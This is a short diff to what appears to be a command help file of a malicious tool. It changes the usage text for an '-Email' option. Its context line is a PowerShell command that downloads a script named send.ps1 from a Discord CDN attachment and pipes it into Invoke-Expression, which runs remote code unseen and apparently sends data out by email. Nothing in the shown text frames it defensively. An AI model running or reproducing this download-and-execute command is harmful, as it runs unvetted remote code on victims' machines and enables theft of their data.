@@ -1,7 +1,6 @@
                                     
                                                                   ========== Commands ============
--Email:
-Powershell $attachment = '{cmdxx}'
+Usage: (-Email) : Powershell $attachment = '{cmdxx}'
      (Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/939931011838509090/946621682653745224/send.ps1").content | Invoke-Expression
      
      
